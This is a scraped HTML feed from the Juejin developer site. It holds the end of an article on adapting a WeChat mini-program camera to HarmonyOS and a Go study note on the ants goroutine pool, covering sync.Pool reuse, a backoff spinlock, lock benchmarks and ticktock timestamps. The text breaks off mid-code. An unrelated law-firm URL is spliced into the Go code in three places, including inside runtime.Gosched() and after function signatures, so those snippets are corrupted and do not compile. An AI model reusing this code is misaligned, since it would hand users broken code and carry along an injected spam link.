	<span class="hljs-title function_">data</span>(<span class="hljs-params"/>){
		<span class="hljs-keyword">return</span> {};
	},
	<span class="hljs-attr">methods</span>:{
		<span class="hljs-title function_">onCameraClick</span>(<span class="hljs-params">e</span>){
			<span class="hljs-comment">//不会触发</span>
		},
		<span class="hljs-title function_">onWrapperClick</span>(<span class="hljs-params">e</span>){
			<span class="hljs-comment">//修补可以正常触发</span>
		}
	}
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-2">三、在纯血鸿蒙下的适配指引</h2>
<ul>
<li>3.1、将AI运动识别插件升级到最新版本，并为纯血鸿蒙版本的用户开启<code>增强模式</code>。</li>
<li>3.2、提示或调用API引导用户升级到最新版本的微信。</li>
<li>3.3、若存在依赖<code>Camera</code>组件非原生事件交互的问题，可使用上述临时方案修复交互。</li>
</ul>
<blockquote>
<p>AI运动小程序在纯血鸿蒙下的适配就为您介绍到这，若有其它的适配场景我们继续为您分享，欢迎关注...</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea4dc4891e3440d89f20a8fb35f6f6ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5pm656eR5oqA55qE5oqA5pyv5bCP6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561792&amp;x-signature=9%2B8UV8crtIc6HxRPdVmg%2FVIFYmQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go ants pool 协程池学习笔记]]></title>    <link>https://juejin.cn/post/7575757258833477658</link>    <guid>https://juejin.cn/post/7575757258833477658</guid>    <pubDate>2025-11-24T04:54:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833477658" data-draft-id="7575748159608684570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go ants pool 协程池学习笔记 "/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-11-24T04:54:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户722786812344"/> <meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go ants pool 协程池学习笔记 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:54:29.000Z" title="Mon Nov 24 2025 04:54:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>使用 Go 开发并发程序很容易，一个 <code>go</code> 关键字就可以启动协程处理任务。Go 创建一个 goroutine 只需要 2K 内存空间，并且 go 协程上下文信息仅存储在两个寄存器中，对于 Go 运行时来说，切换上下文特别快。</p>
<p>不过凡事不加限制就会出问题，如果不加节制的滥用 goroutine 就可能导致内存泄露，增加 Go 运行时调度负担等。</p>
<p>下面看一段 Go http 标准库的代码：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Server)</span></span> Serve(l net.Listener) <span class="hljs-type">error</span> {
	<span class="hljs-keyword">for</span> {
	   ...
	   c := s.newConn(rw)
	   <span class="hljs-keyword">go</span> c.serve(connCtx)  
	}  
}
</code></pre>
<p>当来一个 http 请求，http 会启动一个协程 <code>Server.serve()</code> 处理该请求。<br/>
这种方式对于请求的响应很快，但是如果有恶意大规模并发请求，就可能导致后端服务内存爆增，响应慢等问题。</p>
<p>测试千万并发的内存使用情况如下：</p>
<pre><code class="hljs language-scss" lang="scss">const n = <span class="hljs-number">10000000</span>
    
func <span class="hljs-built_in">demoFunc</span>() {  
    <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Sleep</span>(time.Duration(BenchParam) * <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Millisecond</span>)  
}

func <span class="hljs-built_in">TestNoPool</span>(t *testing.T) {  
    <span class="hljs-selector-tag">var</span> start, end runtime<span class="hljs-selector-class">.MemStats</span>  
    runtime<span class="hljs-selector-class">.ReadMemStats</span>(&amp;start)  
    <span class="hljs-selector-tag">var</span> wg sync<span class="hljs-selector-class">.WaitGroup</span>  
    for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; n; <span class="hljs-selector-tag">i</span>++ {  
       wg<span class="hljs-selector-class">.Add</span>(<span class="hljs-number">1</span>)  
       go <span class="hljs-built_in">func</span>() {  
          <span class="hljs-built_in">demoFunc</span>()  
          wg<span class="hljs-selector-class">.Done</span>()  
       }()  
    }  
    wg<span class="hljs-selector-class">.Wait</span>()  
    runtime<span class="hljs-selector-class">.ReadMemStats</span>(&amp;end)  
    usageMem := end.TotalAlloc/MiB - start.TotalAlloc/MiB  
    t.<span class="hljs-built_in">Logf</span>(<span class="hljs-string">"memory usage:%d MB"</span>, usageMem)  
}
</code></pre>
<p>测试结果：</p>
<pre><code class="hljs language-diff" lang="diff"> go test -v -bench=. -benchmem -run=TestNoPool
<span class="hljs-comment">=== RUN   TestNoPool</span>
    ants_test.go:41: memory usage:1304 M
<span class="hljs-comment">--- PASS: TestNoPool (5.70s）</span>
</code></pre>
<p>当并发量到千万时，内存使用率达到了 1 个多 G，看起来好像不多。不过可别忘了，这里处理的任务只是 <code>time.Sleep</code>，如果每个协程处理内存型或 IO 型任务，那该是多大内存或者 CPU 的消耗，并且调度如此多的协程也会让 Go 运行时（调度器，GC）的压力非常大。</p>
<p>因此，需要协程池来限制协程的使用，起到稳定内存使用率，减轻 Go 运行时负担的目的。</p>
<h2 data-id="heading-1">协程池</h2>
<p>既然协程池的主要任务是限制协程的数量，那么作为池应该有几个需求是要实现的：</p>
<ul>
<li>协程池生命周期管理，包括创建，释放等操作；</li>
<li>协程池的扩缩容，按需使用；</li>
<li>协程池中过期协程的清理；</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpanjf2000%2Fants" target="_blank" title="https://github.com/panjf2000/ants" ref="nofollow noopener noreferrer">ants</a> 是一个满足上述需求的高性能协程池。本文重点学习 <code>ants</code> 的源码了解协程池。</p>
<h2 data-id="heading-2">ants 协程池</h2>
<h3 data-id="heading-3">结构</h3>
<p>首先看代码的层次结构，作为一个协程池库，ants 很扁平，只有一层：</p>
<pre><code class="hljs language-go" lang="go">tree
.
├── CODE_OF_CONDUCT.md
├── CONTRIBUTING.md
├── LICENSE
├── README.md
├── README_ZH.md
├── ants.<span class="hljs-keyword">go</span>
├── ants_benchmark_test.<span class="hljs-keyword">go</span>
├── ants_test.<span class="hljs-keyword">go</span>
├── example_test.<span class="hljs-keyword">go</span>
├── <span class="hljs-keyword">go</span>.mod
├── <span class="hljs-keyword">go</span>.sum
├── multipool.<span class="hljs-keyword">go</span>
├── multipool_func.<span class="hljs-keyword">go</span>
├── multipool_func_generic.<span class="hljs-keyword">go</span>
├── options.<span class="hljs-keyword">go</span>
├── pkg
│   └── sync
│       ├── spinlock.<span class="hljs-keyword">go</span>
│       ├── spinlock_test.<span class="hljs-keyword">go</span>
│       └── sync.<span class="hljs-keyword">go</span>
├── pool.<span class="hljs-keyword">go</span>
├── pool_func.<span class="hljs-keyword">go</span>
├── pool_func_generic.<span class="hljs-keyword">go</span>
├── worker.<span class="hljs-keyword">go</span>
├── worker_func.<span class="hljs-keyword">go</span>
├── worker_func_generic.<span class="hljs-keyword">go</span>
├── worker_loop_queue.<span class="hljs-keyword">go</span>
├── worker_loop_queue_test.<span class="hljs-keyword">go</span>
├── worker_queue.<span class="hljs-keyword">go</span>
├── worker_stack.<span class="hljs-keyword">go</span>
└── worker_stack_test.<span class="hljs-keyword">go</span>
</code></pre>
<p>从结构可以看出，主要分为三类：</p>
<ul>
<li>pool：实现了协程池，是暴露给用户调用的对象；</li>
<li>workqueue：工作队列，负责装载工作协程，其接口实现是 <code>worker_stack</code> 和 <code>worker_loop_queue</code> 对象；</li>
<li>worker：工作协程，是实际执行任务的协程；</li>
</ul>
<p>这个结构还是很清晰的，就不画 UML 图表示了。</p>
<h3 data-id="heading-4">流程</h3>
<h4 data-id="heading-5">设计</h4>
<p>在看流程图之前，先自己想一下，如果让我设计协程池该如何做呢？</p>
<p>平时开发用的比较多的是类似这样的写法：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; workerNumber; i++ {
	<span class="hljs-keyword">go</span> worker()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">()</span></span> {
	<span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> taskC {
		doTask()
	}
}
</code></pre>
<p>程序运行时启动 <code>workerNumber</code> 个协程监听同一个通道 <code>taskC</code>，如果 <code>taskC</code> 有 <code>task</code>，多个协程 <code>worker</code> 会抢 <code>task</code> 并调用 <code>doTask()</code> 处理任务。</p>
<p>这种写法的好处在于简单，缺点在于协程数固定，不能按需灵活使用，而且在程序启动时，<code>workerNumber</code> 个协程就开始运行，如果没有 <code>task</code> 会造成资源浪费。</p>
<p>这种写法对于数量少的协程还行，如果并发过大则需要上协程池了。</p>
<p>使用协程池，还是让 <code>worker</code> 去监听 <code>taskC</code>，不同的是每个 <code>worker</code> 都有自己的 <code>taskC</code>，这样设计的好处是协程 <code>worker</code> 不会打架。</p>
<p>让每个 <code>worker</code> 监听自己的通道，那谁来管理这些 <code>worker</code> 呢？我们可以将这些 <code>worker</code> 存入容器（堆或栈）中。让容器对象来管理 <code>worker</code>，包括插入 <code>worker</code> 到容器，弹出 <code>worker</code> 出容器等。</p>
<p>现在 <code>worker</code> 在容器中了，那什么时候该插入 <code>worker</code> 到容器，什么时候该弹出 <code>worker</code> 呢？</p>
<p>我们想每个 <code>worker</code> 都监听自己的通道，如果 <code>worker</code> 执行完任务就可以插入 <code>worker</code> 到容器，插入 <code>worker</code> 到容器的意思是，该 <code>worker</code> 可用，可以被拿出来执行任务。<br/>
这是插入逻辑，对于弹出，如果生产者需要往 <code>worker</code> 的通道中写任务，发现容器中有一个 <code>worker</code> 可用，就可以从容器中弹出 <code>worker</code> 给生产者使用。弹出的意思是，该 <code>worker</code> 我用了，别人不能在用了。</p>
<p>那么，谁是生产者呢？<br/>
生产者是客户端调用 <code>pool</code> 方法将任务写入 <code>pool</code> 对象，<code>pool</code> 对象从容器中获取可用的 <code>worker</code>，并往该 <code>worker</code> 的通道写入任务。</p>
<p>至此，主要的逻辑都走通了。</p>
<p>还有一点是容器该用栈还是用队列呢？<br/>
<code>worker</code> 写入容器后，如果长时间不用的话需要清理，清理需要按照时间排序。队列是符合这种需求的数据结构（按时间顺序，先进先出）。</p>
<h4 data-id="heading-6">流程图</h4>
<p><code>ants</code> 的流程图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ed176a6f7044758ced8c8e728b7a97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764564869&amp;x-signature=WwLEt%2F%2Bvl93wjZfXD%2Fzd87xvD9E%3D" alt="ants_pool" loading="lazy"/></p>
<p><em>图片来源于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpanjf2000%2Fants%2Fblob%2Fdev%2FREADME_ZH.md" target="_blank" title="https://github.com/panjf2000/ants/blob/dev/README_ZH.md" ref="nofollow noopener noreferrer">Github ants</a></em></p>
<p>结合图片看源码应该会很清晰，这里不在赘述了。</p>
<h3 data-id="heading-7">ants 源码实现</h3>
<p>光了解流程还不够，<code>ants</code> 能在众多协程池中脱颖而出，肯定有它的过人之处。下面从细节出发看源码中有哪些过人之处，毕竟细节是魔鬼。</p>
<h4 data-id="heading-8">sync.Pool 对象复用</h4>
<p>作为协程池，需要频繁创建 <code>worker</code> 对象。<code>ants</code> 使用 <code>sync.Pool</code> 作为对象缓存，复用 <code>worker</code> 对象，降低频繁创建销毁对象导致的内存开销。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> poolCommon <span class="hljs-keyword">struct</span> {
	workerCache sync.Pool
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPool</span><span class="hljs-params">(size <span class="hljs-type">int</span>, options ...Option)</span></span> (*Pool, <span class="hljs-type">error</span>) {  
    ...
    
    <span class="hljs-comment">// sync.Pool 创建对象</span>
    pool.workerCache.New = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> any {  
       <span class="hljs-keyword">return</span> &amp;goWorker{  
          pool: pool,  
          task: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>, workerChanCap),  
       }  
    }  
  
    <span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span>  
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *poolCommon)</span></span> retrieveWorker() (w worker, err <span class="hljs-type">error</span>) {
	...
	<span class="hljs-keyword">if</span> capacity := p.Cap(); capacity == <span class="hljs-number">-1</span> || capacity &gt; p.Running() {  
    p.lock.Unlock()  
    <span class="hljs-comment">// 从 sync.Pool 中取 worker 对象</span>
    w = p.workerCache.Get().(worker)  
    w.run()  
    <span class="hljs-keyword">return</span>  
}
</code></pre>
<h4 data-id="heading-9">sync.spinLock</h4>
<p><code>ants</code> 实现了指数退避锁，如下：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> spinLock <span class="hljs-type">uint32</span>  
  
<span class="hljs-keyword">const</span> maxBackoff = <span class="hljs-number">16</span>  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sl *spinLock)</span></span> Lock() {  
    backoff := <span class="hljs-number">1</span>  
    <span class="hljs-keyword">for</span> !atomic.CompareAndSwapUint32((*<span class="hljs-type">uint32</span>)(sl), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       <span class="hljs-comment">// Leverage the exponential backoff algorithm, see https://en.wikipedia.org/wiki/Exponential_backoff.  </span>
       <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; backoff; i++ {  
          runtime.Gosched(https:<span class="hljs-comment">//www.jiwenlaw.com/)  </span>
       }  
       <span class="hljs-keyword">if</span> backoff &lt; maxBackoff {  
          backoff &lt;&lt;= <span class="hljs-number">1</span>  
       }  
    }  
}
</code></pre>
<p>作为高并发协程池，多个协程抢锁是常态。如果协程长期占有锁，其它协程一直在抢锁会造成资源浪费。<code>ants</code> 使用指数退避算法抢锁减少长时间占有锁的资源抢占。</p>
<p>并且，当抢不到锁时 <code>ants</code> 使用 <code>runtime.Gosched</code> 出让 <code>CPU</code>，而不是空转等待锁（空转协程会一直占用 CPU）。主动出让，而不是被动等待运行时请出 CPU 更加合理且快速，也让其它协程更快的执行抢占逻辑，雨露均沾。</p>
<p>执行基准测试看几种类型锁的执行性能：</p>
<pre><code class="hljs language-scss" lang="scss">func <span class="hljs-built_in">BenchmarkMutex</span>(b *testing.B) {  
    m := sync.Mutex{}  
    <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.RunParallel</span>(func(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type spinLock uint32  
  
func (s *spinLock) <span class="hljs-built_in">Lock</span>() {  
    for !atomic<span class="hljs-selector-class">.CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
    }  
}  
  
func (s *spinLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newSpinLock</span>() *spinLock {  
    return (*spinLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkSpinLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newSpinLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type backoffSpinLock uint32  
  
<span class="hljs-selector-tag">var</span> backoff = <span class="hljs-number">16</span>  
  
func (s *backoffSpinLock) <span class="hljs-built_in">Lock</span>() {  
    <span class="hljs-selector-tag">i</span> := <span class="hljs-number">1</span>  
    for !atomic.<span class="hljs-built_in">CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       if <span class="hljs-selector-tag">i</span> == backoff {  
          continue  
       }  
       <span class="hljs-selector-tag">i</span> &lt;&lt;= <span class="hljs-number">1</span>  
    }  
}  
  
func (s *backoffSpinLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newBackoffSpinLock</span>() *backoffSpinLock {  
    return (*backoffSpinLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkBackoffSpinLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newBackoffSpinLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type spinSchedLock uint32  
  
func (s *spinSchedLock) <span class="hljs-built_in">Lock</span>() {  
    for !atomic<span class="hljs-selector-class">.CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       runtime<span class="hljs-selector-class">.Gosched</span>()  
    }  
}  
  
func (s *spinSchedLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newSpinSchedLock</span>() *spinSchedLock {  
    return (*spinSchedLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkSpinSchedLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newSpinSchedLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type backoffSpinSchedLock uint32  
  
<span class="hljs-selector-tag">var</span> maxBackoff = <span class="hljs-number">16</span>  
  
func (s *backoffSpinSchedLock)https://www.jiwenlaw.com/ <span class="hljs-built_in">Lock</span>() {  
    backoff := <span class="hljs-number">1</span>  
    for !atomic.<span class="hljs-built_in">CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; backoff; <span class="hljs-selector-tag">i</span>++ {  
          runtime<span class="hljs-selector-class">.Gosched</span>()  
       }  
       if backoff &lt; maxBackoff {  
          backoff &lt;&lt;= <span class="hljs-number">1</span>  
       }  
    }  
}  
  
func (s *backoffSpinSchedLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newBackoffSpinSchedLock</span>() *backoffSpinSchedLock {  
    return (*backoffSpinSchedLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkBackoffSpinSchedLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newBackoffSpinSchedLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}
</code></pre>
<p>测试结果：</p>
<pre><code class="hljs language-bash" lang="bash"> go <span class="hljs-built_in">test</span> -v -bench=. -benchmem -run=^$
goos: darwin
goarch: arm64
pkg: github.com/xiahuyun/go-library/ants
cpu: Apple M3
BenchmarkMutex
BenchmarkMutex-8                        17903019                69.40 ns/op            0 B/op          0 allocs/op
BenchmarkSpinLock
BenchmarkSpinLock-8                     15894223               130.3 ns/op             0 B/op          0 allocs/op
BenchmarkBackoffSpinLock
BenchmarkBackoffSpinLock-8              10448190               124.0 ns/op             0 B/op          0 allocs/op
BenchmarkSpinSchedLock
BenchmarkSpinSchedLock-8                339347601                3.026 ns/op           0 B/op          0 allocs/op
BenchmarkBackoffSpinSchedLock
BenchmarkBackoffSpinSchedLock-8         400970906                2.641 ns/op           0 B/op          0 allocs/op
</code></pre>
<p>可以看到在众多锁中 <code>ants</code> 的指数退避锁表现最好。</p>
<h4 data-id="heading-10">purge worker</h4>
<p><code>ants</code> 使用一个清理协程定时清理 <code>workerQueue</code> 中的协程（ants 通过二分查找确定哪些协程是过期需要清理的，非常高效）：</p>
<h4 data-id="heading-11">ticktock</h4>
<p><code>ants</code> 中 <code>worker</code> 在放入队列时需要记录自己放入队列的时间，<code>purgeWorker</code> 会根据该时间确定哪些 <code>worker</code> 需要清理。</p>
<p>如果每个 <code>worker</code> 调用 <code>time.Now()</code> 记录时间，会造成系统资源浪费，<code>time.Now</code> 会执行系统调用，涉及内核态/用户态的切换。</p>
<p><code>ants</code> 使用 <code>ticktock</code> 协程周期性的调用 <code>time.Now</code> 生成时间戳并存到 <code>pool</code> 对象池中。<code>worker</code> 在记录时间放入队列时，只需要从对象池拿时间戳就行，显著避免系统资源消耗：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *poolCommon)</span></span> ticktock() {  https:<span class="hljs-comment">//www.jiwenlaw.com/</span>
    ticker := time.NewTicker(nowTimeUpdateInterval)  
    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {  
       ticker.Stop()  
       atomic.StoreInt32(&amp;p.ticktockDone, <span class="hljs-number">1</span>)  
    }()  
  
    ticktockCtx := p.ticktockCtx <span class="hljs-comment">// copy to the local variable to avoid race from Reboot()  </span>
    <span class="hljs-keyword">for</span> {  
       <span class="hljs-keyword">select</span> {  
       <span class="hljs-keyword">case</span> &lt;-ticktockCtx.Done():  
          <span class="hljs-keyword">return</span>  
       <span class="hljs-keyword">case</span> &lt;-ticker.C:  
       }  
  
       <span class="hljs-keyword">if</span> p.IsClosed() {  
          <span class="hljs-keyword">break</span>  
       }  
  
